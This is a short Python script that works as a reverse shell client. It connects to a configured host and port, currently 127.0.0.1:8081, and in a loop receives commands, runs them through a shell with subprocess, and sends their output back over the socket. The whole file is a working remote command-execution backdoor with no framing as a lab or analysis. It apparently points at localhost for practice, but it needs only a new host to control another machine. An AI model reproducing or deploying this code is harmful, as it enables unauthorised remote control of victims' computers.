import socket
import subprocess

from click import command

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081 #2222

client = socket.socket()
print("[-->] Trying To Connect...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-->] Conection Successful! ")

while True:
    print("[-->] Please enter command | ")
    command = client.recv(1024)
    command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-->] Sending response... ")
    client.send(output + output_error)